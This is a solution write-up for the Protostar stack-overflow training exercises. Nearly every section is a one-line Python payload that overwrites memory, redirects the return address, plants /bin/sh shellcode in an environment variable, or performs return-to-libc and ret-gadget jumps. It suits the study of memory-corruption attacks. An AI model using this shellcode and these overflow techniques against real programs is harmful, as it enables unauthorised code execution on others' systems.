# Protostar
My solution to exploit exercises' Protostar challenge.
I try to have one liners when possible.

# Stack 0
```sh
python -c "print('a'*65)" | ./stack0
```

# Stack 1
```sh
./stack1 `python -c "from struct import pack; print('a'*64+pack('<I', 0x61626364))"`
```

# Stack 2
```sh
GREENIE=`python -c "from struct import pack; print('a'*64+pack('<I', 0x0d0a0d0a))"` ./stack2
```

# Stack 3
```sh
python -c "from struct import pack; print('a'*64+pack('<I', 0x8048424))" | ./stack3
```

# Stack 4
```sh
python -c "from struct import pack; print('a'*76+pack('<I', 0x80483f4))" | ./stack4
```

# Stack 5
This one is not a one liner because I decided to put the shellcode in an environment variable.
`envaddr` was compiled using the source in this repo and is used to guess the shellcode adress.
```sh
export SC=`python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')"`
~/envadrr SC ./stack5
python -c "from struct import pack; print('a'*76+pack('<I', 0xbfffff13))" | ./stack5
```

# Stack 6
For this one I used a return to libc in `system` after putting the adress of $SHELL as the first parameter.
`0xb7ecffb0` is the adress of `sytem()` obtained using GDB and `0xbfffff13` is the adress of $SHELL obtained using `envaddr`
```sh
python -c "from struct import pack; print('a'*80+pack('<II', 0xb7ecffb0, 0xbfffff13))" | ./stack6
```

# Stack 7
Stack 7 is a bit harder because we cannot use the previous trick because the return adress is checked and cannot be in a data region...
Instead we will find a `ret` instruction and return to it, introduction one indirection.
This `ret` instruction will be used to jump to the shellcode we used in stack 5.

Finding the instruction : `objdump -d stack7 | grep ret`

Exploit:
```
python -c "from struct import pack; print('a'*80+pack('<II', 0x80484c2, 0xbfffff13))" | ./stack7
```

